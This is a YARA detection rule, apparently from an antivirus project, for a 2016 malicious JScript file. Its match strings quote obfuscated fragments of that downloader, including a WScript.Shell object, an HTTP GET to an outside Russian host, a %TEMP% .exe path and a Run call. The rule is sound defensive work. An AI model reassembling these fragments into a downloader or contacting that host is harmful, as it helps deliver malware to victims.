rule sig_20160330_e1b801771f1864c3b29adc773ade24a3 {
  meta:
    description = "datamaliciousorder - file 20160330_e1b801771f1864c3b29adc773ade24a3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6370045b2b7de22473a032e337efe081eeddfa63df2e84b8595b55f4fe85fcd2"

  strings:
    $s1  = "var _Z1 = function _W() {return WScript[_IU](\"WScript\"+\".Shell\");}(), _F = 11;" fullword ascii
    $s2  = "function _CO(_B, _MV){_E = _E * 1; return _B - _MV;};" fullword ascii
    $s3  = "_J[_EF](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s4  = "if (_J[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _BC() {return _Z1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"fHzkqIyr07K5.ex\" + \"e\";};" fullword ascii
    $s6  = "function _C(){return _Y + \"\";};" fullword ascii
    $s7  = "function _Z() {return ((_RS == true) && (_RS == _YF)) ? 1 : _E;};" fullword ascii
    $s8  = "function _GS(_TT){_Z1[\"Run\"](_TT, _E, _E);};" fullword ascii
    $s9  = "function _HO(){return 22;};" fullword ascii
    $s10 = "function _KV()" fullword ascii
    $s11 = "var _O = new this[\"Date\"]();" fullword ascii
    $s12 = "function _QJ(){return _IU;};" fullword ascii
    $s13 = " while (_NZ){" fullword ascii
    $s14 = "function _D(_FM) {var _RA = (1, 2, 3, 4, 5, _FM); return _RA;};" fullword ascii
    $s15 = "return _CO(_SU, _MM);" fullword ascii
    $s16 = "var _YF = false;" fullword ascii
    $s17 = "var _RS = false;" fullword ascii
    $s18 = "_RS = true; " fullword ascii
    $s19 = "_YF = true; " fullword ascii
    $s20 = "var _KW = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}